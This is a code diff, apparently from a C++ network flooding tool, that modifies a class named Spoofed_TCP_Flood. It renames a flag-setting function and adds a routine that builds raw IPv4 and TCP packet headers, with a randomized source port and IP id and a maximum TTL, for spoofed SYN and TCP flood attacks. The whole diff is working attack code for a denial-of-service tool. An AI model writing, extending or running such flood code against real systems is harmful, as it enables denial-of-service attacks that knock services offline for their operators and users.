@@ -41,7 +41,7 @@ void Spoofed_TCP_Flood::attack(const int *id) {
             }
 
             init_headers(ip, tcp, buf);
-            override_options(tcp);
+            override_headers(tcp, ip);
 
             dst.sin_addr.s_addr = ip->daddr;
             dst.sin_family = AF_UNSPEC;
@@ -83,7 +83,7 @@ Spoofed_TCP_Flood::Spoofed_TCP_Flood(const config *conf, Logger *logger) : Spoof
 
 }
 
-void Spoofed_TCP_Flood::override_options(tcphdr *tcp){
+void Spoofed_TCP_Flood::override_headers(tcphdr *tcp, iphdr *ip){
     switch (conf->vector){
         case config::SpoofedSyn:
             tcp->syn = 1;
@@ -96,4 +96,36 @@ void Spoofed_TCP_Flood::override_options(tcphdr *tcp){
             break;
         default:break;
     }
+}
+
+void Spoofed_TCP_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
+    auto s_port = Randomizer::randomPort();
+    // IP Struct
+    ip->ihl = 5;
+    ip->version = 4;
+    ip->tos = 16;
+    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(buf);
+    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
+    ip->frag_off = htons(0x0);
+    ip->ttl = 255;
+    ip->protocol = IPPROTO_TCP;
+    ip->check = 0;
+
+    ip->check = csum((unsigned short *) buf, ip->tot_len);
+
+    // TCP Struct
+    tcp->source = htons(static_cast<uint16_t>(s_port));
+    tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+    tcp->seq = 0;
+    tcp->ack_seq = 0;
+    tcp->doff = 5;  //tcp header size
+    tcp->fin=0;
+    tcp->syn=0;
+    tcp->rst=0;
+    tcp->psh=0;
+    tcp->ack=0;
+    tcp->urg=0;
+    tcp->window = htons (5840);
+    tcp->check = 0;
+    tcp->urg_ptr = 0;
 }
